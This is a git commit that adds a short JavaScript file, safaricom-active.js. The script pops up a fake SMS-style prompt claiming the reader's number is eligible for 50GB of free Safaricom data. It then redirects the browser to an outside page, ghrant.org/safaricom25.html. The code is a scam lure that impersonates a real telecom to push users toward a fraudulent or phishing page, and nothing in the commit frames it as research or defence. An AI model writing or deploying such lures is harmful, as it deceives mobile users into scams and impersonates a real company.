4950f9a3e698434c2cda618dc879147d137c7ce8
mfednewblog8 <nsikakimoh68@gmail.com>
2025-11-21 07:55:39 +0100

    Create safaricom-active.js

---
+++ safaricom-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulation, your number is eligible to receive 50gb free data Safaricom, click OK to activate now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://ghrant.org/safaricom25.html';
+}
